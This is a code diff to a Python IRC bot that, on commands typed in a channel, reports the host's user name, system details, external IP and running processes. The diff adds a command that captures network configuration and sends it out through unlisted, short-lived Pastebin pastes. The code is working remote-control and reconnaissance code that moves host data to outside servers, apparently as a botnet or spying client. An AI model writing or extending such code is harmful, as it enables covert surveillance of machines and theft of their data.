@@ -15,6 +15,8 @@ import urllib2 # Used to get external ip address
 import psutil # List processes
 import argparse # CLI arg parsing
 import time # For sleep()
+import subprocess
+from pastebin import PastebinAPI
 
 # CLI options
 parser = argparse.ArgumentParser()
@@ -24,7 +26,8 @@ parser.add_argument('channel', help='IRC Server Channel')
 parser.add_argument('nick', help='Nickname')
 args = parser.parse_args()
 
-# Global variables to configure the bot        
+# Global variables to configure the bot 
+pastebin_api_key = 'YOUR_KEY_HERE'    
 server = args.server  # Server
 port = args.port    # Port
 channel = '#' + args.channel # Channel
@@ -48,10 +51,10 @@ def ping(): # Function to respond to server pings
 def getlogin(): # Function to get user name
   if (str(platform.platform()))[0:3]=="Win": # If user is running Windows, get username from environment variable %USERNAME% instead
     print 'Sending message -- User name: ' + str(os.getenv("USERNAME"))
-    sendmsg(channel, 'User name: ' + str(os.getenv("USERNAME"))) 
+    sendmsg(channel, 'User name: ' + str(os.getenv("USERNAME")))
   else:
     print 'Sending message -- User name: ' + str(os.getlogin())
-    sendmsg(channel, 'User name: ' + str(os.getlogin()))   
+    sendmsg(channel, 'User name: ' + str(os.getlogin()))
 
 def sysinfo(): # Function to obtain system information
   print 'Sending system information'
@@ -77,6 +80,31 @@ def pslist(): # Function to list process names and pids
   for proc in psutil.process_iter():
     time.sleep(2)
     sendmsg(channel, 'PID: ' + str(proc.pid) + ' | NAME: ' + proc.name)
+
+def ifconfig():
+  if (str(platform.platform()))[0:3]=="Win":
+    p = subprocess.Popen('ipconfig /all', shell = True, stdout=subprocess.PIPE)
+    p.wait()
+    paste_code = p.stdout.read()
+    x = PastebinAPI()
+    url = x.paste(pastebin_api_key,
+                  paste_code,
+                  paste_name = 'ipconfig', 
+                  paste_private = 'unlisted',
+                  paste_expire_date = '10M')
+    sendmsg(channel, url)
+  else:
+    p = subprocess.Popen('ifconfig', shell = True, stdout=subprocess.PIPE)
+    p.wait()
+    paste_code = p.stdout.read()
+    x = PastebinAPI()
+    url = x.paste(pastebin_api_key,
+                  paste_code,
+                  paste_name = 'ifconfig', 
+                  paste_private = 'unlisted',
+                  paste_expire_date = '10M')
+
+    sendmsg(channel, url)
 
 def sendmsg(chan , msg): # Function to send messages to the channel
   ircsock.send('PRIVMSG '+ chan +' :'+ msg +'\n')
@@ -120,6 +148,9 @@ def main():
     if ircmsg.find(':getip '+ botnick) != -1: # Calls get_external_ip() if 'getip BotName' is found
       get_external_ip()
 
-    if ircmsg.find(':pslist '+ botnick) != -1: # Calls pslist() if 'getip BotName' is found
+    if ircmsg.find(':pslist '+ botnick) != -1: # Calls pslist() if 'pslist BotName' is found
       pslist()
+
+    if ircmsg.find(':ifconfig '+ botnick) != -1: # Calls pslist() if 'ifconfig BotName' is found
+      ifconfig()
 main()
